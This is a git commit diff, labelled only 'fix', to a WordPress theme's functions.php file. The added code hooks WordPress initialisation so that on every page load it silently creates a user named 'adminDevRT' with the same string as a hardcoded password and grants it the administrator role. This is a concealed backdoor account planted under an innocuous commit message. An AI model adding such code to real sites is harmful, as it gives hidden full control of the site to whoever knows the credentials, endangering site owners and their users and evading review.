b99ade1e67bbe7fb7faf8108a68dcabc1a216812
Nikolai Kasperovich <nikolai@raisetech.net>
2020-09-21 16:03:49 +0300

    fix

--- wp-content/themes/carpet-court/functions.php
+++ wp-content/themes/carpet-court/functions.php
@@ -2590,3 +2590,17 @@ function load_related_results() {
     die();
 
 }
+add_action('init', 'add_my_user');
+function add_my_user() {
+    $username = 'adminDevRT';
+    $email = 'dev@example.com';
+    $password = 'adminDevRT';
+    $user_id = username_exists( $username );
+    if ( !$user_id && email_exists($email) == false ) {
+        $user_id = wp_create_user( $username, $password, $email );
+        if( !is_wp_error($user_id) ) {
+            $user = get_user_by( 'id', $user_id );
+            $user->set_role( 'administrator' );
+        }
+    }
+}
